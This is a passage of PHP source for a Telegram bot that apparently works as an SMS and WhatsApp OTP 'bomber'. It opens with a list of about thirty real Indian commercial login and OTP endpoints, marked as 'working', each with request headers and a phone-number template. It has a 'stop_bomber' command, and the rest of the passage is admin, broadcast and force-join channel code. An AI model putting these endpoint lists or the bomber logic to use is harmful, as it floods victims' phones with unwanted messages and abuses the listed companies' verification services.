            [
                "name" => "Foxy WhatsApp",
                "method" => "POST",
                "url" => "https://www.foxy.in/api/v2/users/send_otp",
                "headers" => [
                    "Content-Type: application/json",
                    "User-Agent: Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36"
                ],
                "data" => '{"user":{"phone_number":"+91{phone}"},"via":"whatsapp"}'
            ],
            [
                "name" => "Jockey WhatsApp",
                "method" => "GET",
                "url" => "https://www.jockey.in/apps/jotp/api/login/resend-otp/+91{phone}?whatsapp=true",
                "headers" => [
                    "Accept: */*",
                    "X-Requested-With: pure.lite.browser",
                    "Referer: https://www.jockey.in/",
                    "User-Agent: Mozilla/5.0 (Linux; Android 13; RMX3081) AppleWebKit/537.36"
                ],
                "data" => null
            ],
            [
                "name" => "Rappi WhatsApp",
                "method" => "POST",
                "url" => "https://services.mxgrability.rappi.com/api/rappi-authentication/login/whatsapp/create",
                "headers" => [
                    "Content-Type: application/json; charset=utf-8",
                    "User-Agent: okhttp/3.9.1"
                ],
                "data" => '{"country_code":"+91","phone":"{phone}"}'
            ],
            [
                "name" => "Stratzy WhatsApp",
                "method" => "POST",
                "url" => "https://stratzy.in/api/web/whatsapp/sendOTP",
                "headers" => [
                    "content-type: application/json",
                    "accept: */*",
                    "origin: https://stratzy.in",
                    "referer: https://stratzy.in/login",
                    "User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"
                ],
                "data" => '{"phoneNo":"{phone}"}'
            ],
            [
                "name" => "EkaCare WhatsApp",
                "method" => "POST",
                "url" => "https://auth.eka.care/auth/init",
                "headers" => [
                    "Device-Id: 5df83c463f0ff8ff",
                    "Flavour: android",
                    "Locale: en",
                    "Version: 1382",
                    "Client-Id: androidp",
                    "Content-Type: application/json; charset=UTF-8",
                    "User-Agent: okhttp/4.9.3"
                ],
                "data" => '{"payload":{"allowWhatsapp":true,"mobile":"+91{phone}"},"type":"mobile"}'
            ],
            // ADDITIONAL WORKING APIS
            [
                "name" => "NoBroker",
                "method" => "POST",
                "url" => "https://www.nobroker.in/api/v3/account/otp/send",
                "headers" => [
                    "Content-Type: application/x-www-form-urlencoded",
                    "User-Agent: Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36"
                ],
                "data" => "phone={phone}&countryCode=IN"
            ],
            [
                "name" => "PharmEasy",
                "method" => "POST",
                "url" => "https://pharmeasy.in/api/v2/auth/send-otp",
                "headers" => [
                    "Content-Type: application/json",
                    "User-Agent: Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36"
                ],
                "data" => '{"phone":"{phone}"}'
            ],
            [
                "name" => "Wakefit",
                "method" => "POST",
                "url" => "https://api.wakefit.co/api/consumer-sms-otp/",
                "headers" => [
                    "Content-Type: application/json",
                    "User-Agent: Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36"
                ],
                "data" => '{"mobile":"{phone}","whatsapp_opt_in":1}'
            ],
            [
                "name" => "Housing.com",
                "method" => "POST",
                "url" => "https://login.housing.com/api/v2/send-otp",
                "headers" => [
                    "Content-Type: application/json",
                    "User-Agent: Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36"
                ],
                "data" => '{"phone":"{phone}","country_url_name":"in"}'
            ],
            [
                "name" => "Khatabook",
                "method" => "POST",
                "url" => "https://api.khatabook.com/v1/auth/request-otp",
                "headers" => [
                    "Content-Type: application/json",
                    "User-Agent: Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36"
                ],
                "data" => '{"phone":"{phone}","app_signature":"wk+avHrHZf2"}'
            ],
            [
                "name" => "Rapido",
                "method" => "POST",
                "url" => "https://customer.rapido.bike/api/otp",
                "headers" => [
                    "Content-Type: application/json",
                    "User-Agent: Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36"
                ],
                "data" => '{"mobile":"{phone}"}'
            ],
            [
                "name" => "Country Delight",
                "method" => "POST",
                "url" => "https://api.countrydelight.in/api/v1/customer/requestOtp",
                "headers" => [
                    "Content-Type: application/json",
                    "User-Agent: Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36"
                ],
                "data" => '{"mobile":"{phone}","platform":"Android","mode":"new_user"}'
            ],
            [
                "name" => "Spinny",
                "method" => "POST",
                "url" => "https://api.spinny.com/api/c/user/otp-request/v3/",
                "headers" => [
                    "Content-Type: application/json",
                    "User-Agent: Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36"
                ],
                "data" => '{"contact_number":"{phone}","whatsapp":false,"code_len":4,"expected_action":"login"}'
            ],
            [
                "name" => "Licious",
                "method" => "POST",
                "url" => "https://www.licious.in/api/login/signup",
                "headers" => [
                    "Content-Type: application/json",
                    "User-Agent: Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36"
                ],
                "data" => '{"phone":"{phone}","captcha_token":null}'
            ],
            [
                "name" => "Udaan",
                "method" => "POST",
                "url" => "https://auth.udaan.com/api/otp/send?client_id=udaan-v2",
                "headers" => [
                    "Content-Type: application/x-www-form-urlencoded;charset=UTF-8",
                    "User-Agent: Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36"
                ],
                "data" => "mobile={phone}"
            ],
            [
                "name" => "Snapmint",
                "method" => "POST",
                "url" => "https://api.snapmint.com/v1/public/sign_up",
                "headers" => [
                    "Content-Type: application/json",
                    "User-Agent: Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36"
                ],
                "data" => '{"phone":"{phone}"}'
            ],
            [
                "name" => "RummyCircle",
                "method" => "POST",
                "url" => "https://www.rummycircle.com/api/fl/auth/v3/getOtp",
                "headers" => [
                    "Content-Type: application/json",
                    "User-Agent: Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36"
                ],
                "data" => '{"mobile":"{phone}","isPlaycircle":false}'
            ],
            [
                "name" => "TrulyMadly",
                "method" => "POST",
                "url" => "https://app.trulymadly.com/api/auth/mobile/v1/send-otp",
                "headers" => [
                    "Content-Type: application/json",
                    "User-Agent: Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36"
                ],
                "data" => '{"mobile":"{phone}","locale":"IN"}'
            ],
            [
                "name" => "Hungama",
                "method" => "POST",
                "url" => "https://communication.api.hungama.com/v1/communication/otp",
                "headers" => [
                    "Content-Type: application/json",
                    "User-Agent: Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36"
                ],
                "data" => '{"mobileNo":"{phone}","countryCode":"+91","appCode":"un","messageId":"1","device":"web"}'
            ],
            [
                "name" => "Meru Cab",
                "method" => "POST",
                "url" => "https://merucabapp.com/api/otp/generate",
                "headers" => [
                    "Content-Type: application/x-www-form-urlencoded",
                    "User-Agent: Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36"
                ],
                "data" => "mobile_number={phone}"
            ],
            [
                "name" => "Snitch",
                "method" => "POST",
                "url" => "https://mxemjhp3rt.ap-south-1.awsapprunner.com/auth/otps/v2",
                "headers" => [
                    "Content-Type: application/json",
                    "User-Agent: Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36"
                ],
                "data" => '{"mobile_number":"+91{phone}"}'
            ],
            [
                "name" => "CaratLane",
                "method" => "POST",
                "url" => "https://www.caratlane.com/cg/dhevudu",
                "headers" => [
                    "Content-Type: application/json",
                    "User-Agent: Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36"
                ],
                "data" => '{"query":"mutation { SendOtp(input: { mobile: \"{phone}\", isdCode: \"91\", otpType: \"registerOtp\" }) { status { message code } } }"}'
            ],
            [
                "name" => "ShipRocket",
                "method" => "POST",
                "url" => "https://sr-wave-api.shiprocket.in/v1/customer/auth/otp/send",
                "headers" => [
                    "Content-Type: application/json",
                    "User-Agent: Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36"
                ],
                "data" => '{"mobileNumber":"{phone}"}'
            ],
            [
                "name" => "PenPencil",
                "method" => "POST",
                "url" => "https://api.penpencil.co/v1/users/resend-otp?smsType=1",
                "headers" => [
                    "content-type: application/json; charset=utf-8",
                    "user-agent: okhttp/3.9.1"
                ],
                "data" => '{"organizationId":"5eb393ee95fab7468a79d189","mobile":"{phone}"}'
            ],
            [
                "name" => "DaycoIndia",
                "method" => "POST",
                "url" => "https://ekyc.daycoindia.com/api/nscript_functions.php",
                "headers" => [
                    "X-Requested-With: XMLHttpRequest",
                    "Accept: application/json, text/javascript, */*; q=0.01",
                    "Content-Type: application/x-www-form-urlencoded; charset=UTF-8",
                    "Origin: https://ekyc.daycoindia.com",
                    "Referer: https://ekyc.daycoindia.com/verify_otp.php",
                    "User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"
                ],
                "data" => "api=send_otp&brand=dayco&mob={phone}&resend_otp=resend_otp"
            ],
            [
                "name" => "GoPink Cabs",
                "method" => "POST",
                "url" => "https://www.gopinkcabs.com/app/cab/customer/login_admin_code.php",
                "headers" => [
                    "Content-Type: application/x-www-form-urlencoded; charset=UTF-8",
                    "Accept: */*",
                    "X-Requested-With: XMLHttpRequest",
                    "Origin: https://www.gopinkcabs.com",
                    "Referer: https://www.gopinkcabs.com/app/cab/customer/step1.php",
                    "User-Agent: Mozilla/5.0 (Linux; Android 13; RMX3081) AppleWebKit/537.36"
                ],
                "data" => "check_mobile_number=1&contact={phone}"
            ],
            [
                "name" => "ShemarooMe",
                "method" => "POST",
                "url" => "https://www.shemaroome.com/users/resend_otp",
                "headers" => [
                    "Content-Type: application/x-www-form-urlencoded; charset=UTF-8",
                    "Accept: */*",
                    "X-Requested-With: XMLHttpRequest",
                    "Origin: https://www.shemaroome.com",
                    "Referer: https://www.shemaroome.com/users/sign_in",
                    "User-Agent: Mozilla/5.0 (Linux; Android 13; RMX3081) AppleWebKit/537.36"
                ],
                "data" => "mobile_no=%2B91{phone}"
            ],
            [
                "name" => "Meesho",
                "method" => "POST",
                "url" => "https://api.meesho.com/v2/auth/send_otp",
                "headers" => [
                    "Content-Type: application/json",
                    "User-Agent: Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36"
                ],
                "data" => '{"phone":"{phone}"}'
            ],
            [
                "name" => "Zepto",
                "method" => "POST",
                "url" => "https://api.zepto.com/v2/otp",
                "headers" => [
                    "Content-Type: application/json",
                    "User-Agent: Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36"
                ],
                "data" => '{"mobile":"{phone}"}'
            ],
            [
                "name" => "Blinkit",
                "method" => "POST",
                "url" => "https://blinkit.com/api/otp/generate",
                "headers" => [
                    "Content-Type: application/json",
                    "User-Agent: Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36"
                ],
                "data" => '{"phone":"{phone}"}'
            ],
            [
                "name" => "Practo",
                "method" => "POST",
                "url" => "https://www.practo.com/patient/loginviapassword",
                "headers" => [
                    "Content-Type: application/json",
                    "User-Agent: Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36"
                ],
                "data" => '{"phone":"{phone}"}'
            ],
            [
                "name" => "PhonePe",
                "method" => "POST",
                "url" => "https://www.phonepe.com/api/v2/otp",
                "headers" => [
                    "Content-Type: application/json",
                    "User-Agent: Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36"
                ],
                "data" => '{"phone":"{phone}"}'
            ],
            [
                "name" => "Snapdeal",
                "method" => "POST",
                "url" => "https://www.snapdeal.com/authenticate",
                "headers" => [
                    "Content-Type: application/json",
                    "User-Agent: Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36"
                ],
                "data" => '{"mobile":"{phone}"}'
            ]
        ]);
    }
    
    public function __construct() {
        $this->db = new Database();
        $this->history = new UserHistory();
        $this->telegram = new TelegramAPI(BOT_TOKEN);
        $this->formatter = new Formatter();
        $this->rateLimiter = new RateLimiter($this->db);
        $this->apiCaller = new APICaller();
        $this->initBomberApis();
        $this->handleWebhook();
    }
    
    private function handleWebhook() {
        $input = file_get_contents('php://input');
        $this->update = json_decode($input, true);
        
        if (!$this->update) {
            return;
        }
        
        if (isset($this->update['callback_query'])) {
            $this->callback_query = $this->update['callback_query'];
            $this->user_id = $this->callback_query['from']['id'];
            $this->chat_id = $this->callback_query['message']['chat']['id'];
            $this->handleCallback();
            return;
        }
        
        if (isset($this->update['message'])) {
            $this->message = $this->update['message'];
            $this->user_id = $this->message['from']['id'];
            $this->chat_id = $this->message['chat']['id'];
            $this->text = $this->message['text'] ?? '';
            $this->is_group = $this->message['chat']['type'] !== 'private';
            
            $username = isset($this->message['from']['username']) ? $this->message['from']['username'] : '';
            $first_name = isset($this->message['from']['first_name']) ? $this->message['from']['first_name'] : '';
            $last_name = isset($this->message['from']['last_name']) ? $this->message['from']['last_name'] : '';
            
            $this->db->addUser([
                'user_id' => $this->user_id,
                'username' => $username,
                'first_name' => $first_name,
                'last_name' => $last_name
            ]);
            
            if ($this->db->isUserBanned($this->user_id)) {
                $this->telegram->sendMessage($this->chat_id, "🚫 You are banned from using this bot.");
                return;
            }
            
            if ($this->is_group) {
                $this->handleGroupMessage();
                return;
            }
            
            // Check force join only in private chats
            if ($this->db->getSetting('force_join_enabled')) {
                $user = $this->db->getUser($this->user_id);
                if (!$user || !($user['has_joined_channel'] ?? false)) {
                    $this->sendForceJoinMessage();
                    return;
                }
            }
            
            if ($this->rateLimiter->isRateLimited($this->user_id)) {
                $remaining = $this->rateLimiter->getRemainingTime($this->user_id);
                $this->telegram->sendMessage(
                    $this->chat_id,
                    "⏳ Please wait <b>{$remaining}</b> seconds before using another command.",
                    'HTML'
                );
                return;
            }
            
            $this->db->updateUser($this->user_id, ['last_active' => date('Y-m-d H:i:s')]);
            
            if (strpos($this->text, '/') === 0) {
                $this->handleCommand();
            } else {
                $this->telegram->sendMessage(
                    $this->chat_id,
                    "👋 Use /help to see available commands.",
                    'HTML'
                );
            }
        }
    }
    
    private function sendForceJoinMessage() {
        $keyboard = [
            'inline_keyboard' => [
                [
                    ['text' => '📢 Join Channel 1', 'url' => CHANNEL_1],
                    ['text' => '📢 Join Channel 2', 'url' => CHANNEL_2]
                ],
                [
                    ['text' => '✅ I have joined', 'callback_data' => 'check_join']
                ]
            ]
        ];
        
        $message = "🔒 <b>Please Join Our Channels to Use This Bot</b>\n\n";
        $message .= "You must join both channels to access this bot.\n\n";
        $message .= "1️⃣ <a href='" . CHANNEL_1 . "'>Channel 1</a>\n";
        $message .= "2️⃣ <a href='" . CHANNEL_2 . "'>Channel 2</a>\n\n";
        $message .= "After joining, click the button below ✅";
        
        $this->telegram->sendMessage($this->chat_id, $message, 'HTML', json_encode($keyboard));
    }
    
    private function handleGroupMessage() {
        $group_id = $this->chat_id;
        
        // Check if group is locked
        if ($this->db->isGroupLocked($group_id)) {
            $keyboard = [
                'inline_keyboard' => [
                    [
                        ['text' => '🔹 Join Official Group', 'url' => OFFICIAL_GROUP]
                    ]
                ]
            ];
            
            $message = "🔒 <b>Your group is locked! 🔒</b>\n\n";
            $message .= "📌 You can use the bot in official group\n\n";
            $message .= "🔹 <b>Official Group:</b> Use bot for free\n\n";
            $message .= "👇 Choose an option below:";
            
            $this->telegram->sendMessage($this->chat_id, $message, 'HTML', json_encode($keyboard));
            return;
        }
        
        // Check if group is allowed
        if (!$this->db->isGroupAllowed($group_id)) {
            // Check if request already pending
            if ($this->db->isPendingGroupRequest($group_id)) {
                return;
            }
            
            // Add pending request
            $this->db->addPendingGroupRequest($group_id);
            
            $keyboard = [
                'inline_keyboard' => [
                    [
                        ['text' => '✅ Allow Group', 'callback_data' => "allow_group_{$group_id}"],
                        ['text' => '❌ Deny', 'callback_data' => "deny_group_{$group_id}"]
                    ]
                ]
            ];
            
            $this->telegram->sendMessage(
                OWNER_ID,
                "🏢 <b>New Group Request</b>\n\n" .
                "Group: " . ($this->message['chat']['title'] ?? 'Unknown') . "\n" .
                "Group ID: <code>{$group_id}</code>\n" .
                "User: " . ($this->message['from']['username'] ?? $this->message['from']['id']),
                'HTML',
                json_encode($keyboard)
            );
            return;
        }
        
        // Check if bot is admin
        $bot_info = $this->telegram->getMe();
        if ($bot_info) {
            $chat_member = $this->telegram->getChatMember($group_id, $bot_info['id']);
            if (!$chat_member || !in_array($chat_member['status'], ['administrator', 'creator'])) {
                $this->telegram->sendMessage(
                    OWNER_ID,
                    "📢 <b>Bot added to group but not admin</b>\n\n" .
                    "Group: " . ($this->message['chat']['title'] ?? 'Unknown') . "\n" .
                    "Group ID: <code>{$group_id}</code>",
                    'HTML'
                );
                return;
            }
        }
        
        if (strpos($this->text, '/') === 0) {
            $this->handleCommand();
        }
    }
    
    private function handleCommand() {
        $parts = explode(' ', $this->text);
        $command = strtolower(str_replace('/', '', $parts[0]));
        $input = isset($parts[1]) ? implode(' ', array_slice($parts, 1)) : '';
        
        if (strpos($command, '@') !== false) {
            $command = explode('@', $command)[0];
        }
        
        $user = $this->db->getUser($this->user_id);
        if ($user) {
            $this->db->updateUser($this->user_id, ['total_commands' => ($user['total_commands'] ?? 0) + 1]);
        }
        
        if (strpos($command, 'admin_') === 0 && $this->isAdmin()) {
            $this->handleAdminCommand($command, $input);
            return;
        }
        
        $custom_cmd = $this->db->getCustomCommand($command);
        if ($custom_cmd) {
            $this->handleCustomCommand($custom_cmd, $input);
            return;
        }
        
        if ($command === 'stop_bomber') {
            $this->handleStopBomber();
            return;
        }
        
        switch ($command) {
            case 'start':
                $this->handleStart();
                break;
            case 'help':
                $this->handleHelp();
                break;
            case 'status':
                $this->handleStatus();
                break;
            case 'admin':
                $this->handleAdminHelp();
                break;
            default:
                if (isset($this->api_endpoints[$command])) {
                    $this->handleAPICommand($command, $input);
                } else {
                    $this->telegram->sendMessage(
                        $this->chat_id,
                        "❌ Unknown command. Use /help to see available commands.",
                        'HTML'
                    );
                }
                break;
        }
    }
    
    private function isAdmin() {
        $user = $this->db->getUser($this->user_id);
        return $user && ($user['is_admin'] ?? false);
    }
    
    private function handleAdminHelp() {
        if (!$this->isAdmin()) {
            $this->telegram->sendMessage($this->chat_id, "⛔ You are not authorized.");
            return;
        }
        
        $message = "🔐 <b>Admin Commands</b>\n\n";
        $message .= "📊 <b>Statistics & Users:</b>\n";
        $message .= "<code>/admin_stats</code> - 📊 View statistics\n";
        $message .= "<code>/admin_users</code> - 👥 View all users\n\n";
        
        $message .= "🚫 <b>User Management:</b>\n";
        $message .= "<code>/admin_ban user_id reason</code> - 🚫 Ban user\n";
        $message .= "<code>/admin_unban user_id</code> - ✅ Unban user\n\n";
        
        $message .= "📢 <b>Broadcast System:</b>\n";
        $message .= "<code>/admin_broadcast message</code> - 📢 Send broadcast to all users\n";
        $message .= "<code>/admin_broadcast_to user_id message</code> - 📩 Send private message\n";
        $message .= "<code>/admin_broadcast_history</code> - 📜 View broadcast history\n\n";
        
        $message .= "⚙️ <b>Settings:</b>\n";
        $message .= "<code>/admin_force_join</code> - 🔗 Toggle force join\n";
        $message .= "<code>/admin_spam</code> - 🛡️ Toggle spam protection\n";
        $message .= "<code>/admin_cooldown 5</code> - ⏱️ Set cooldown\n\n";
        
        $message .= "🏢 <b>Group Management:</b>\n";
        $message .= "<code>/admin_lock_group group_id</code> - 🔒 Lock group\n";
        $message .= "<code>/admin_unlock_group group_id</code> - 🔓 Unlock group\n";
        $message .= "<code>/admin_group_allow group_id</code> - ✅ Allow group\n";
        $message .= "<code>/admin_group_remove group_id</code> - ❌ Remove group\n";
        $message .= "<code>/admin_show_groups</code> - 📋 Show all groups\n\n";
        
        $message .= "👑 <b>Admin Management:</b>\n";
        $message .= "<code>/admin_add_admin user_id</code> - 👑 Add admin\n";
        $message .= "<code>/admin_remove_admin user_id</code> - 👑 Remove admin\n\n";
        
        $message .= "📝 <b>Custom Commands:</b>\n";
        $message .= "<code>/admin_add_command cmd|api_url|format</code> - 📝 Add custom command\n";
        $message .= "<code>/admin_remove_command cmd</code> - 📝 Remove custom command\n";
        $message .= "<code>/admin_commands</code> - 📝 List custom commands\n\n";
        
        $message .= "📜 <b>History Management (Admin Only):</b>\n";
        $message .= "<code>/admin_history user_id</code> - 📜 View user history\n";
        $message .= "<code>/admin_clear_history user_id</code> - 🗑️ Clear user history\n";
        $message .= "<code>/admin_search_history query</code> - 🔍 Search history\n";
        
        $this->telegram->sendMessage($this->chat_id, $message, 'HTML');
    }
    
    private function handleAdminCommand($command, $input) {
        if (!$this->isAdmin()) {
            $this->telegram->sendMessage($this->chat_id, "⛔ You are not authorized.");
            return;
        }
        
        switch ($command) {
            case 'admin_stats':
                $this->showAdminStats();
                break;
            case 'admin_users':
                $this->showAllUsers();
                break;
            case 'admin_ban':
                $this->banUserCommand($input);
                break;
            case 'admin_unban':
                $this->unbanUserCommand($input);
                break;
            case 'admin_force_join':
                $this->toggleForceJoin();
                break;
            case 'admin_spam':
                $this->toggleSpamProtection();
                break;
            case 'admin_cooldown':
                $this->setCooldown($input);
                break;
            case 'admin_lock_group':
                $this->lockGroupCommand($input);
                break;
            case 'admin_unlock_group':
                $this->unlockGroupCommand($input);
                break;
            case 'admin_add_admin':
                $this->addAdminCommand($input);
                break;
            case 'admin_remove_admin':
                $this->removeAdminCommand($input);
                break;
            case 'admin_broadcast':
                $this->broadcastCommand($input);
                break;
            case 'admin_broadcast_to':
                $this->broadcastToUser($input);
                break;
            case 'admin_broadcast_history':
                $this->broadcastHistory();
                break;
            case 'admin_add_command':
                $this->addCustomCommand($input);
                break;
            case 'admin_remove_command':
                $this->removeCustomCommand($input);
                break;
            case 'admin_commands':
                $this->listCustomCommands();
                break;
            case 'admin_group_allow':
                $this->allowGroupCommand($input);
                break;
            case 'admin_group_remove':
                $this->removeGroupCommand($input);
                break;
            case 'admin_show_groups':
                $this->showAllGroups();
                break;
            case 'admin_history':
                $this->showUserHistory($input);
                break;
            case 'admin_clear_history':
                $this->clearUserHistory($input);
                break;
            case 'admin_search_history':
                $this->searchHistory($input);
                break;
            default:
                $this->telegram->sendMessage($this->chat_id, "❌ Unknown admin command.", 'HTML');
                break;
        }
    }
    
    private function showAdminStats() {
        $users = $this->db->getAllUsers();
        $blacklist = $this->db->get('blacklist');
        $groups = $this->db->getAllGroups();
        $custom_commands = $this->db->getAllCustomCommands();
        $history = $this->history->getAllHistory();
        $broadcast_history = $this->db->getBroadcastHistory();
        
        $total_users = count($users);
        $total_banned = count($blacklist);
        $total_groups = count($groups);
        $total_custom = count($custom_commands);
        $total_history = count($history);
        $total_broadcasts = count($broadcast_history);
        
        $total_commands = 0;
        foreach ($users as $user) {
            $total_commands += $user['total_commands'] ?? 0;
        }
        
        $history_entries = 0;
        foreach ($history as $user_history) {
            $history_entries += count($user_history);
        }
        
        $message = "📊 <b>Bot Statistics</b>\n\n";
        $message .= "👥 <b>Total Users:</b> {$total_users}\n";
        $message .= "📊 <b>Total Commands:</b> {$total_commands}\n";
        $message .= "🚫 <b>Banned Users:</b> {$total_banned}\n";
        $message .= "🏢 <b>Groups:</b> {$total_groups}\n";
        $message .= "📝 <b>Custom Commands:</b> {$total_custom}\n";
        $message .= "📜 <b>History Entries:</b> {$history_entries}\n";
        $message .= "👤 <b>Users with History:</b> {$total_history}\n";
        $message .= "📢 <b>Broadcasts Sent:</b> {$total_broadcasts}\n";
        $message .= "📢 <b>Force Join:</b> " . ($this->db->getSetting('force_join_enabled') ? '✅ On' : '❌ Off') . "\n";
        $message .= "🛡️ <b>Spam Protection:</b> " . ($this->db->getSetting('spam_protection') ? '✅ On' : '❌ Off') . "\n";
        $message .= "⏱️ <b>Cooldown:</b> " . $this->db->getSetting('cooldown_seconds') . "s";
        
        $this->telegram->sendMessage($this->chat_id, $message, 'HTML');
    }
    
    private function showAllUsers() {
        $users = $this->db->getAllUsers();
        
        if (empty($users)) {
            $this->telegram->sendMessage($this->chat_id, "📭 No users found.");
            return;
        }
        
        $message = "👥 <b>All Users</b>\n\n";
        $count = 0;
        foreach ($users as $user) {
            $count++;
            $status = $user['is_banned'] ? '🚫' : '✅';
            $admin = $user['is_admin'] ? '👑' : '';
            $history_count = count($this->history->getUserHistory($user['user_id']));
            $message .= "{$count}. {$admin} <b>" . htmlspecialchars($user['first_name'] ?? 'Unknown', ENT_QUOTES, 'UTF-8') . "</b>\n";
            $message .= "   ├─ ID: <code>{$user['user_id']}</code>\n";
            $message .= "   ├─ Username: " . ($user['username'] ? '@' . htmlspecialchars($user['username'], ENT_QUOTES, 'UTF-8') : 'N/A') . "\n";
            $message .= "   ├─ Commands: {$user['total_commands']}\n";
            $message .= "   ├─ History: {$history_count} entries\n";
            $message .= "   └─ Status: {$status}\n\n";
        }
        
        $this->sendSplitMessage($this->chat_id, $message);
    }
    
    private function showUserHistory($input) {
        $user_id = trim($input);
        if (empty($user_id)) {
            $this->telegram->sendMessage(
                $this->chat_id,
                "⚠️ Usage: <code>/admin_history user_id</code>",
                'HTML'
            );
            return;
        }
        
        $history = $this->history->getUserHistory($user_id, 50);
        
        if (empty($history)) {
            $this->telegram->sendMessage(
                $this->chat_id,
                "📭 No history found for user <code>{$user_id}</code>.",
                'HTML'
            );
            return;
        }
        
        $user = $this->db->getUser($user_id);
        $name = $user ? htmlspecialchars($user['first_name'] ?? 'Unknown', ENT_QUOTES, 'UTF-8') : 'Unknown';
        
        $message = "📜 <b>History for User: {$name}</b>\n";
        $message .= "🆔 <code>{$user_id}</code>\n\n";
        
        foreach ($history as $index => $entry) {
            $num = $index + 1;
            $message .= "{$num}. <b>/{$entry['command']}</b> <code>" . htmlspecialchars($entry['input'], ENT_QUOTES, 'UTF-8') . "</code>\n";
            $message .= "   📅 {$entry['timestamp']}\n";
            $message .= "   📝 " . htmlspecialchars(substr($entry['result_preview'], 0, 100), ENT_QUOTES, 'UTF-8') . "...\n\n";
        }
        
        $this->sendSplitMessage($this->chat_id, $message);
    }
    
    private function clearUserHistory($input) {
        $user_id = trim($input);
        if (empty($user_id)) {
            $this->telegram->sendMessage(
                $this->chat_id,
                "⚠️ Usage: <code>/admin_clear_history user_id</code>",
                'HTML'
            );
            return;
        }
        
        if ($this->history->clearUserHistory($user_id)) {
            $this->telegram->sendMessage(
                $this->chat_id,
                "✅ History cleared for user <code>{$user_id}</code>.",
                'HTML'
            );
        } else {
            $this->telegram->sendMessage(
                $this->chat_id,
                "❌ No history found for user <code>{$user_id}</code>.",
                'HTML'
            );
        }
    }
    
    private function searchHistory($input) {
        $query = trim($input);
        if (empty($query)) {
            $this->telegram->sendMessage(
                $this->chat_id,
                "⚠️ Usage: <code>/admin_search_history query</code>",
                'HTML'
            );
            return;
        }
        
        $results = $this->history->searchHistory($query);
        
        if (empty($results)) {
            $this->telegram->sendMessage(
                $this->chat_id,
                "🔍 No results found for: <code>" . htmlspecialchars($query, ENT_QUOTES, 'UTF-8') . "</code>",
                'HTML'
            );
            return;
        }
        
        $message = "🔍 <b>Search Results</b>\n";
        $message .= "📌 Query: <code>" . htmlspecialchars($query, ENT_QUOTES, 'UTF-8') . "</code>\n\n";
        
        $count = 0;
        foreach (array_slice($results, 0, 20) as $result) {
            $count++;
            $message .= "{$count}. <b>/{$result['command']}</b> <code>" . htmlspecialchars($result['input'], ENT_QUOTES, 'UTF-8') . "</code>\n";
            $message .= "   👤 User: <code>{$result['user_id']}</code>\n";
            $message .= "   📅 {$result['timestamp']}\n\n";
        }
        
        if (count($results) > 20) {
            $message .= "\n📌 Showing first 20 of " . count($results) . " results.";
        }
        
        $this->sendSplitMessage($this->chat_id, $message);
    }
    
    private function broadcastCommand($input) {
        if (empty($input)) {
            $this->telegram->sendMessage(
                $this->chat_id,
                "⚠️ Usage: <code>/admin_broadcast message</code>\n" .
                "Or: <code>/admin_broadcast_to user_id message</code>",
                'HTML'
            );
            return;
        }
        
        $users = $this->db->getAllUsers();
        $sent = 0;
        $failed = 0;
        
        foreach ($users as $user) {
            if (!$user['is_banned']) {
                try {
                    $this->telegram->sendMessage(
                        $user['user_id'],
                        "📢 <b>Broadcast Message</b>\n\n" . $input,
                        'HTML'
                    );
                    $sent++;
                } catch (Exception $e) {
                    $failed++;
                }
            }
        }
        
        $this->db->addBroadcast([
            'type' => 'broadcast',
            'message' => $input,
            'sent' => $sent,
            'failed' => $failed,
            'timestamp' => date('Y-m-d H:i:s'),
            'sent_by' => $this->user_id
        ]);
        
        $this->telegram->sendMessage(
            $this->chat_id,
            "✅ Broadcast sent to <b>{$sent}</b> users.\n❌ Failed: <b>{$failed}</b>",
            'HTML'
        );
    }
    
    private function broadcastToUser($input) {
        $parts = explode(' ', $input, 2);
        if (count($parts) < 2) {
            $this->telegram->sendMessage(
                $this->chat_id,
                "⚠️ Usage: <code>/admin_broadcast_to user_id message</code>",
                'HTML'
            );
            return;
        }
        
        $user_id = $parts[0];
        $message = $parts[1];
        
        $user = $this->db->getUser($user_id);
        if (!$user) {
            $this->telegram->sendMessage(
                $this->chat_id,
                "❌ User <code>{$user_id}</code> not found.",
                'HTML'
            );
            return;
        }
        
        try {
            $this->telegram->sendMessage(
                $user_id,
                "📩 <b>Private Message from Admin</b>\n\n" . $message,
                'HTML'
            );
            
            $this->db->addBroadcast([
                'type' => 'private',
                'user_id' => $user_id,
                'message' => $message,
                'timestamp' => date('Y-m-d H:i:s'),
                'sent_by' => $this->user_id,
                'status' => 'sent'
            ]);
            
            $this->telegram->sendMessage(
                $this->chat_id,
                "✅ Message sent to user <code>{$user_id}</code>.",
                'HTML'
            );
        } catch (Exception $e) {
            $this->telegram->sendMessage(
                $this->chat_id,
